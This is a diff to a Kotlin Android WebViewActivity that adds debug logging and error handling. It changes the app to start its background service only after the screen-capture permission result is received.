@@ -13,6 +13,7 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Environment
 import android.provider.Settings
+import android.util.Log
 import android.view.KeyEvent
 import android.view.View
 import android.webkit.CookieManager
@@ -215,25 +216,37 @@ class WebViewActivity : AppCompatActivity() {
 
     private fun requestScreenCapture() {
         try {
+            Log.d("WebViewActivity", "Requesting screen capture permission")
             ScreenCapture.requestPermission(this, SCREEN_REQUEST_CODE)
-        } catch (_: Exception) {}
-        android.os.Handler(mainLooper).postDelayed({ startBackgroundService() }, 5000)
+        } catch (e: Exception) {
+            Log.e("WebViewActivity", "requestScreenCapture err: ${e.message}")
+            startBackgroundService()
+        }
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == SCREEN_REQUEST_CODE) {
-            ScreenCapture.onPermissionResult(this, resultCode, data)
+            val ok = ScreenCapture.onPermissionResult(this, resultCode, data)
+            Log.d("WebViewActivity", "Screen capture permission result: $ok")
+            // ✅ ابدأ الخدمة فقط بعد استلام النتيجة
+            android.os.Handler(mainLooper).postDelayed({
+                startBackgroundService()
+            }, 1000)
         }
     }
 
     private fun startBackgroundService() {
-        createNotificationChannel()
-        val intent = Intent(this, BackgroundService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+        try {
+            createNotificationChannel()
+            val intent = Intent(this, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+        } catch (e: Exception) {
+            Log.e("WebViewActivity", "startService err: ${e.message}")
         }
     }
 
